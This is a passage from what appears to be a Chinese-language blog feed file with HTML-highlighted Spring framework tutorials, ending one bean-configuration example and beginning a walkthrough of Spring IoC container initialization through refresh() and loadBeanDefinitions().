class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 订单 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.wh.spring.model.Order<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100110001110<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>float<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>20.00<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.wh.spring<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p><strong>运行测试</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>ApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ClassPathXmlApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>UserController<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>Product<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>wh<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>model<span class="token punctuation">.</span>User<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 主入口 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApplicationContextMain</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取UserController</span>        UserController userController <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>UserController<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        User user <span class="token operator">=</span> userController<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// @Value</span>        Product product <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>Product<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>product<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 关闭</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span>ClassPathXmlApplicationContext<span class="token punctuation">)</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>运行结果</strong></p><pre><code>-----------User类初始化方法-------------------------UserController类初始化方法--------------User{name=&#39;小明&#39;, age=6, order=Order{orderNumber=&#39;100110001110&#39;, price=20.0}}Product{productName=&#39;一本小黄书&#39;}----------UserController类销毁方法-------------------------User类销毁方法--------------</code></pre><h3 id="color-green-学习推荐：-https-ke-qq-com-course-434219"><a href="#color-green-学习推荐：-https-ke-qq-com-course-434219" class="headerlink" title="$\color{green}{学习推荐：}$https://ke.qq.com/course/434219"></a>$\color{green}{学习推荐：}$<a href="https://ke.qq.com/course/434219" target="_blank" rel="noopener">https://ke.qq.com/course/434219</a></h3><h3 id="或者加群进行讨论：857565362，并获取学习资源"><a href="#或者加群进行讨论：857565362，并获取学习资源" class="headerlink" title="或者加群进行讨论：857565362，并获取学习资源"></a>或者加群进行讨论：857565362，并获取学习资源</h3>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
          <category> Spring源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
            <tag> Spring源码 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring IoC一、容器初始化过程</title>
      <link href="/2020/05/24/spring-ioc-yi-rong-qi-chu-shi-hua-guo-cheng/"/>
      <url>/2020/05/24/spring-ioc-yi-rong-qi-chu-shi-hua-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-IoC一、容器初始化过程"><a href="#Spring-IoC一、容器初始化过程" class="headerlink" title="Spring IoC一、容器初始化过程"></a>Spring IoC一、容器初始化过程</h1><blockquote><p>本文追踪Spring运行程序流程分析Ioc容器初始化的过程。</p><p>依赖注入的部分在下一篇文章，都写在一篇文章内，不易阅读</p></blockquote><p>阅读前提：</p><blockquote><p>读者需掌握Spring基本使用和概念，如果没有相关基础，请先阅读上一篇文章《Spring基础及相关知识概述》、《Spring由Bean出发的使用及相关核心功能》</p></blockquote><p>阅读的方法:</p><blockquote><p>1.找思路</p><p>2.找入口（所有查看源码的一个方式）</p><p>3.主路和分支一定要分清楚，不要在不重要的分支上深入，容易懵</p></blockquote><h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><p>JDK1.8</p><p><strong>Spring5.1.7</strong></p><p>Maven</p><p>Idea</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.1.7.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h2 id="二、基础概念"><a href="#二、基础概念" class="headerlink" title="二、基础概念"></a>二、基础概念</h2><p><strong>1. BeanFactory</strong></p><p>​    BeanFactory提供的是最基本的IoC容器的功能，它是一个接口定义IoC容器最基本的形式，并且提供了IoC容器应该遵守的最底层和最基本的编程规范，这些接口定义勾画出了IoC的基本轮廓。</p><p>​    在Spring中BeanFactroy只是一个接口，在下图可以看到BeanFactory常见的具体实现DefaultListableBeanFactory、ApplicationContext，当然这只是诸多实现之一。</p><p><img src="https://upload-images.jianshu.io/upload_images/21601015-e08cff94621b3da8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BeanFactory.png"></p><p>​    在BeanFactory中设计了我们经常使用一些主要方法</p><p>​        <strong>getBean()</strong></p><p>​                通过这个方法，可以获取被IoC容器中管理的Bean</p><p>​        <strong>containsBean()</strong></p><p>​                能够判断容器中是否包含指定名称的Bean</p><p>​        <strong>isSingleton()</strong></p><p>​                通过名称查询指定的Bean是否为Singleton类型</p><p>​        <strong>getAliases()</strong></p><p>​                获取指定Bean的所有别名</p><p><strong>下面是是详细的结构图</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/21601015-86d8eac33616d5b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BeanFactory2.png"></p><p><strong>2. FactoryBean</strong></p><p>​    FactoryBean是一个能够生成对象的工厂的Bean，它是创建Bean的一种方式</p><p><strong>3.  BeanDefinition</strong></p><p>​    Spring通过定义BeanDefinition来管理Spring应用中的各种对象以及它们之间的相互依赖关系。</p><p>对于Ioc容器来说，BeanDefinition就是对依赖反转模式中管理的对象依赖关系和数据抽象，也是容器实现依赖反转功能的核心数据结构，依赖反转功能都是围绕对这个BeanDefinition的处理完成的</p><p><strong>可以看图理解一下</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/21601015-66def1da202a1698.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>全的类图，方便梳理类之间的关系<br><img src="https://upload-images.jianshu.io/upload_images/21601015-998c9f707bc0df4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ApplicationContext.png"></p><h2 id="三、从ClassPathXmlApplicationContext开始分析"><a href="#三、从ClassPathXmlApplicationContext开始分析" class="headerlink" title="三、从ClassPathXmlApplicationContext开始分析"></a>三、从ClassPathXmlApplicationContext开始分析</h2><p>​    这个载入过程，相当于把定义的BeanDefinition在IoC容器中转化为一个Spring内部表示的数据结构的过程。Ioc容器对Bean的管理和依赖注入功能的实现，是通过对其持有的BeanDefinition进行各种相关操作完成的。这些BeanDefinition数据在容器中通过一个HashMap来保持和维护。</p><p>​    下面，我们通过ClassPathXmlApplicationContext入手来分析一下IoC容器的初始化过程</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ApplicationContext context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>ClassPathXmlApplicationContext的构造方法，从给定的XML文件中自动刷新上下文，这个构造很直白，继续追踪</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Create a new ClassPathXmlApplicationContext, loading the definitions * from the given XML file and automatically refreshing the context. * @param configLocation resource location * @throws BeansException if context creation failed */</span><span class="token keyword">public</span> <span class="token function">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span>String configLocation<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>   <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>configLocation<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Create a new ClassPathXmlApplicationContext with the given parent,     * loading the definitions from the given XML files.     * @param configLocations array of resource locations     * @param refresh whether to automatically refresh the context,     * loading all bean definitions and creating all singletons.     * Alternatively, call refresh manually after further configuring the context.     * @param parent the parent context     * @throws BeansException if context creation failed     * @see #refresh()     */</span>    <span class="token keyword">public</span> <span class="token function">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> configLocations<span class="token punctuation">,</span> <span class="token keyword">boolean</span> refresh<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> ApplicationContext parent<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 定义配置文件数组 String[] configLocations</span>        <span class="token function">setConfigLocations</span><span class="token punctuation">(</span>configLocations<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>refresh<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 载入BeanDefinition的入口</span>            <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>下面是<code>refresh()</code>方法，核心、重点，重点，重点</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException<span class="token punctuation">,</span> IllegalStateException <span class="token punctuation">{</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>startupShutdownMonitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Prepare this context for refreshing.</span>            <span class="token comment" spellcheck="true">// 1.准备刷新上下文环境，主要是一些状态的准备</span>            <span class="token function">prepareRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Tell the subclass to refresh the internal bean factory.</span>            <span class="token comment" spellcheck="true">// 2.驱动子类进行工厂的刷新，主要是进行BeanFactory的初始化 -- 重点</span>            ConfigurableListableBeanFactory beanFactory <span class="token operator">=</span> <span class="token function">obtainFreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Prepare the bean factory for use in this context.</span>            <span class="token comment" spellcheck="true">// 3.准备BeanFactory所需条件及进行功能填充 -- 重点</span>            <span class="token function">prepareBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Allows post-processing of the bean factory in context subclasses.</span>                <span class="token comment" spellcheck="true">// 4.允许在上下文子类中对bean工厂进行后置处理，即在子类中添加后置处理功能 -- 重点</span>                <span class="token function">postProcessBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Invoke factory processors registered as beans in the context.</span>                <span class="token comment" spellcheck="true">// 5.在上下文中调用注册为bean的工厂处理器 -- 重点</span>                <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Register bean processors that intercept bean creation.</span>                <span class="token comment" spellcheck="true">// 6.注册“拦截bean”创建的bean后置处理器（仅注册，getBean时调用） -- 重点</span>                <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Initialize message source for this context.</span>                <span class="token comment" spellcheck="true">// 7.初始化消息资源，国际化</span>                <span class="token function">initMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Initialize event multicaster for this context.</span>                <span class="token comment" spellcheck="true">// 8.初始化上下文中的事件广播器</span>                <span class="token function">initApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Initialize other special beans in specific context subclasses.</span>                <span class="token comment" spellcheck="true">// 9.初始化特定上下文子类中的其他特殊bean，支持自定义功能增强</span>                <span class="token function">onRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Check for listener beans and register them.</span>                <span class="token comment" spellcheck="true">// 10.在已注册的bean中查找监听Bean，并注册到事件广播器中</span>                <span class="token function">registerListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Instantiate all remaining (non-lazy-init) singletons.</span>                <span class="token comment" spellcheck="true">// 11.实例化所有剩余的（非延迟初始化）单例 -- 重点</span>                <span class="token function">finishBeanFactoryInitialization</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Last step: publish corresponding event.</span>                <span class="token comment" spellcheck="true">// 12.发布相应事件进行通知，刷新方法整体结束</span>                <span class="token function">finishRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isWarnEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    logger<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"Exception encountered during context initialization - "</span> <span class="token operator">+</span>                            <span class="token string">"cancelling refresh attempt: "</span> <span class="token operator">+</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Destroy already created singletons to avoid dangling resources.</span>                <span class="token function">destroyBeans</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Reset 'active' flag.</span>                <span class="token function">cancelRefresh</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Propagate exception to caller.</span>                <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">finally</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Reset common introspection caches in Spring's core, since we</span>                <span class="token comment" spellcheck="true">// might not ever need metadata for singleton beans anymore...</span>                <span class="token function">resetCommonCaches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>我们重点看<code>obtainFreshBeanFactory()</code>方法里，注意它是<code>AbstractApplicationContext</code>中的方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractApplicationContext</span> <span class="token keyword">extends</span> <span class="token class-name">DefaultResourceLoader</span>        <span class="token keyword">implements</span> <span class="token class-name">ConfigurableApplicationContext</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">/**     * Tell the subclass to refresh the internal bean factory.     * @return the fresh BeanFactory instance     * @see #refreshBeanFactory()     * @see #getBeanFactory()     */</span>    <span class="token keyword">protected</span> ConfigurableListableBeanFactory <span class="token function">obtainFreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">refreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Subclasses must implement this method to perform the actual configuration load.     * The method is invoked by {@link #refresh()} before any other initialization work.     * &lt;p>A subclass will either create a new bean factory and hold a reference to it,     * or return a single BeanFactory instance that it holds. In the latter case, it will     * usually throw an IllegalStateException if refreshing the context more than once.     * @throws BeansException if initialization of the bean factory failed     * @throws IllegalStateException if already initialized and multiple refresh     * attempts are not supported     */</span>    <span class="token keyword">protected</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">refreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException<span class="token punctuation">,</span> IllegalStateException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>能看到<code>refreshBeanFactory()</code>是个抽象方法，我们看它的具体实现<code>AbstractRefreshableApplicationContext</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractRefreshableApplicationContext</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractApplicationContext</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * This implementation performs an actual refresh of this context's underlying     * bean factory, shutting down the previous bean factory (if any) and     * initializing a fresh bean factory for the next phase of the context's lifecycle.     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">refreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hasBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">destroyBeans</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">closeBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 创建IoC容器，这里使用的是DefaultListableBeanFactory</span>            DefaultListableBeanFactory beanFactory <span class="token operator">=</span> <span class="token function">createBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            beanFactory<span class="token punctuation">.</span><span class="token function">setSerializationId</span><span class="token punctuation">(</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 在加载BeanDefinition时是否允许对已有的BeanDefinition覆写以及是否允许循环引用</span>            <span class="token function">customizeBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// BeanDefinition的加载过程</span>            <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>beanFactoryMonitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>beanFactory <span class="token operator">=</span> beanFactory<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationContextException</span><span class="token punctuation">(</span><span class="token string">"I/O error parsing bean definition source for "</span> <span class="token operator">+</span> <span class="token function">getDisplayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Customize the internal bean factory used by this context.     * Called for each {@link #refresh()} attempt.     * &lt;p>The default implementation applies this context's     * {@linkplain #setAllowBeanDefinitionOverriding "allowBeanDefinitionOverriding"}     * and {@linkplain #setAllowCircularReferences "allowCircularReferences"} settings,     * if specified. Can be overridden in subclasses to customize any of     * {@link DefaultListableBeanFactory}'s settings.     * @param beanFactory the newly created bean factory for this context     * @see DefaultListableBeanFactory#setAllowBeanDefinitionOverriding     * @see DefaultListableBeanFactory#setAllowCircularReferences     * @see DefaultListableBeanFactory#setAllowRawInjectionDespiteWrapping     * @see DefaultListableBeanFactory#setAllowEagerClassLoading     */</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">customizeBeanFactory</span><span class="token punctuation">(</span>DefaultListableBeanFactory beanFactory<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>allowBeanDefinitionOverriding <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            beanFactory<span class="token punctuation">.</span><span class="token function">setAllowBeanDefinitionOverriding</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>allowBeanDefinitionOverriding<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>allowCircularReferences <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            beanFactory<span class="token punctuation">.</span><span class="token function">setAllowCircularReferences</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>allowCircularReferences<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里的loadBeanDefinitions() 实际上是一个抽象方法，具体实现实际上是在<code>AbstractXmlApplicationContext</code>中</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Load bean definitions into the given bean factory, typically through     * delegating to one or more bean definition readers.     * @param beanFactory the bean factory to load bean definitions into     * @throws BeansException if parsing of the bean definitions failed     * @throws IOException if loading of bean definition files failed     * @see org.springframework.beans.factory.support.PropertiesBeanDefinitionReader     * @see org.springframework.beans.factory.xml.XmlBeanDefinitionReader     */</span>    <span class="token keyword">protected</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>DefaultListableBeanFactory beanFactory<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeansException<span class="token punctuation">,</span> IOException<span class="token punctuation">;</span></code></pre><p>在这个loadBeanDefinitions中，初始化了读取器XmlBeanDefinitionReader，然后在IoC中设置好读取器，最后是启动这个读取器来完成BeanDefinition在IoC容器中的载入</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractXmlApplicationContext</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractRefreshableConfigApplicationContext</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * Loads the bean definitions via an XmlBeanDefinitionReader.     * @see org.springframework.beans.factory.xml.XmlBeanDefinitionReader     * @see #initBeanDefinitionReader     * @see #loadBeanDefinitions     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>DefaultListableBeanFactory beanFactory<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Create a new XmlBeanDefinitionReader for the given BeanFactory.</span>        <span class="token comment" spellcheck="true">// XML读取器</span>        XmlBeanDefinitionReader beanDefinitionReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XmlBeanDefinitionReader</span><span class="token 